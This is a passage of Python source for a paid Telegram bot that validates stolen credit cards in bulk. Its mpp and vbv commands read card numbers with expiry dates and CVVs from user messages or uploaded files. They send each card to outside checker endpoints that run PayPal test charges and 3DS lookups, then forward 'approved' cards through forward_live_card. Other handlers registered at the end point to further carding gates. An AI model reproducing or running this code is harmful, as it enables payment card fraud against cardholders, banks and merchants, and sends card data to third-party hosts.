        result_status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌" if status.lower() == "dead" else "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"

        final = (
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖: {card}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬: {gateway}\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧: {result_status}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {response_msg}\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ⇾ {bank}\n"
            f"[↯] 𝗕𝗿𝗮𝗻𝗱 ⇾ {brand} - {ctype} - {brand}\n"
            f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country}\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 : {time_taken}\n"
            f"[↯] 𝗨𝘀𝗲𝗿: {name}\n"
            "━━━━━━━━━━━━━━━━━━━"
        )

        try:
            processing.delete()
        except:
            pass

        msg.reply_text(final)

        if status.lower() != "dead":
            forward_live_card(context.bot, final)

    except Exception as e:
        try:
            processing.delete()
        except:
            pass
        msg.reply_text(f"❌ API Error: {e}")
    if status.lower() != "dead":
      forward_live_card(context.bot, final)


def mpp_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user
    user_id = str(user.id)
    name = user.first_name

    # Check plan
    if not has_active_plan(user_id):
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌\n"
            "⟡ 𝑷𝑳𝑨𝑵 ↯ 𝑵𝑶𝑵𝑬\n"
            "⟡ 𝑬𝑿𝑷𝑰𝑹𝒀 ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        return

    # Extract CCs from file reply
    if not msg.reply_to_message or not msg.reply_to_message.document:
        msg.reply_text("✦ 𝑰𝑵𝑷𝑼𝑻 𝑹𝑬𝑸𝑼𝑰𝑹𝑬𝑫 ✦\n\n⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑹𝑬𝑷𝑳𝒀 𝑾𝑰𝑻𝑯 𝑨 .txt 𝑭𝑰𝑳𝑬 \n⟡ 𝑭𝑰𝑳𝑬 𝑺𝑯𝑶𝑼𝑳𝑫 𝑪𝑶𝑵𝑻𝑨𝑰𝑵 𝑪𝑪 𝑰𝑵 cc|mm|yy|cvv 𝑭𝑶𝑹𝑴𝑨𝑻 \n━━━━━━━━━━━━━━━━━━━")
        return

    file = msg.reply_to_message.document.get_file()
    file_path = f"temp_{user_id}.txt"
    file.download(custom_path=file_path)

    with open(file_path, "r") as f:
         lines = f.read().splitlines()

         os.remove(file_path)

# ✅ Extract valid CCs from lines
    

    # Extract valid CCs
    ccs = [extract_cc(line) for line in lines if extract_cc(line)]
    total = len(ccs)
    if total == 0:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑵𝑶 𝑽𝑨𝑳𝑰𝑫 𝑪𝑪 𝑭𝑶𝑼𝑵𝑫\n━━━━━━━━━━━━━━━━━━━\n")
        return

    if total > 100:
        ccs = ccs[:100]
        note = "\n✦ 𝑳𝑰𝑴𝑰𝑻 𝑬𝑿𝑪𝑬𝑬𝑫𝑬𝑫 ✦\n\n⟡ 𝑪𝑯𝑬𝑪𝑲𝑰𝑵𝑮 𝑳𝑰𝑴𝑰𝑻 𝑰𝑺 100 𝑪𝑪 𝑶𝑵𝑳𝒀\n⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑺𝑬𝑵𝑫 𝑼𝑵𝑫𝑬𝑹 𝑻𝑯𝑰𝑺 𝑳𝑰𝑴𝑰𝑻 \n━━━━━━━━━━━━━━━━━━━\n"
    else:
        note = ""

    processing_msg = msg.reply_text(
        f"✦ 𝑪𝑪 𝑪𝑯𝑬𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 ✦\n\n"
        f"⟡ 𝑻𝑶𝑻𝑨𝑳 ↯ {total}\n"
        f"{note}\n"
        f"⟡ 𝑮𝑨𝑻𝑬   ↯  𝑷𝑨𝒀𝑷𝑨𝑳 𝑫𝑰𝑹𝑬𝑪𝑻 0.01$\n"
        f"⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻...\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    approved = []
    declined = []
    start_time = time.time()

    for cc in ccs:
        try:
            r = requests.get(f"https://proxkamal.com/kamal/pp.php?lista={cc}", timeout=30)
            res = r.json()
        except Exception as e:
            declined.append(f"{cc} | ERROR | {e}")
            continue

        status = res.get("status", "Unknown")
        response_msg = res.get("response_message", "N/A")
        gateway = res.get("gateway", "N/A")
        bank = res.get("bin_info", {}).get("bank", "N/A")
        brand = res.get("bin_info", {}).get("brand", "N/A")
        ctype = res.get("bin_info", {}).get("type", "N/A")
        country = res.get("bin_info", {}).get("country", "N/A")
        duration = res.get("time_taken", "N/A")

        final = (
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖 ↯ {cc}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ↯ {gateway}\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {'✅ Approved' if status.lower() != 'dead' else '❌ Declined'}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯ {response_msg}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ⇾ {bank}\n"
            f"[↯] 𝗕𝗿𝗮𝗻𝗱 ⇾ {brand} - {ctype} - {brand}\n"
            f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 : {duration}\n"
            f"[↯] 𝗨𝘀𝗲𝗿: {name}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )

        # Save to result list
        if status.lower() != "dead":
            approved.append(f"{cc} | APPROVED | {response_msg}")
            forward_live_card(context.bot, final)
        else:
            declined.append(f"{cc} | DECLINED | {response_msg}")

    end_time = time.time()
    total_time = round(end_time - start_time, 2)

    filename = f"pp_result_{user_id}.txt"
    with open(filename, "w") as f:
        for line in approved + declined:
            f.write(f"{line}\n")

    caption = (
        f"✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑹𝑬𝑺𝑼𝑳𝑻 ✦\n\n"
        f"⟡ 𝑻𝑶𝑻𝑨𝑳 ↯ {total}\n"
        f"⟡ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ↯ {len(approved)}\n"
        f"⟡ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ↯ {len(declined)}\n"
        f"⟡ 𝑻𝑰𝑴𝑬 ↯ {total_time}s\n"
        f"⟡ 𝑮𝑨𝑻𝑬   ↯  𝑷𝑨𝒀𝑷𝑨𝑳 𝑫𝑰𝑹𝑬𝑪𝑻 0.01$\n"
        f"⟡ 𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ↯ {name}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    try:
        processing_msg.delete()
    except:
        pass

    msg.reply_document(document=open(filename, "rb"), caption=caption)
    os.remove(filename)


def vbv_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user
    name = user.first_name
    text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = extract_cc(text)  # Your existing extract_cc() function

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /vbv cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/vbv 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    processing_msg = msg.reply_text(
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺\n"
        f"[↯] 𝑪𝑪 ↯ {cc}\n"
        f"[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□\n"
        f"[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...\n"
        f"[↯] 𝑮𝑨𝑻𝑬 ↯ 3DS Lookup\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    start = time.time()
    try:
        api_url = f"https://kamalxd.com/vbv/vbv.php?lista={cc}"
        res = requests.get(api_url, timeout=20).json()
        response_status = res.get("Status", "N/A")
        response_msg = res.get("Response", "N/A")
        gateway = res.get("Gate", "N/A")
        bank = res.get("Bank", "N/A")
        country = "N/A"  # Not provided in API
        brand = "N/A - N/A - N/A"  # Not detailed in response
        time_taken = res.get("Took", f"{time.time() - start:.2f}")

        final = (
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖: {cc}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬: {gateway}\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧: {response_status}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {response_msg}\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ⇾ {bank}\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 : {time_taken}s\n"
            f"[↯] 𝗨𝘀𝗲𝗿: {name}\n"
            "━━━━━━━━━━━━━━━━━━━"
        )

        processing_msg.delete()
        msg.reply_text(final)

    except Exception as e:
        processing_msg.delete()
        msg.reply_text(f"❌ API Error: {e}")
        

    
# Register all user handlers
def register_user_commands(dispatcher):
    dispatcher.add_handler(CommandHandler("mre", mre_command))
    dispatcher.add_handler(CommandHandler("redeem", redeem_command))
    dispatcher.add_handler(CommandHandler("b3", b3_command))
    dispatcher.add_handler(MessageHandler(Filters.regex(r"^/b3\s"), b3_command))
    dispatcher.add_handler(MessageHandler(Filters.reply & Filters.text & Filters.regex(r"^/b3"), b3_command))
    dispatcher.add_handler(CommandHandler("chk", chk_command))
    dispatcher.add_handler(CommandHandler("mchk", mchk_command))
    dispatcher.add_handler(MessageHandler(Filters.regex(r"^/chk\s"), chk_command))
    dispatcher.add_handler(MessageHandler(Filters.reply & Filters.text & Filters.regex(r"^/chk"), chk_command))
    dispatcher.add_handler(CommandHandler("sf", sf_command))
    dispatcher.add_handler(CommandHandler("sho", sho_command))
    dispatcher.add_handler(CommandHandler("sk", sk_command))
    dispatcher.add_handler(CommandHandler("info", info_command))
    dispatcher.add_handler(CommandHandler("add", add_command))
    dispatcher.add_handler(CommandHandler("sh", sh_command))
    dispatcher.add_handler(CommandHandler("msh", msh_command))
    dispatcher.add_handler(CommandHandler("pp", pp_command))
    dispatcher.add_handler(CommandHandler("mpp", mpp_command))
    dispatcher.add_handler(CommandHandler("vbv", vbv_command))
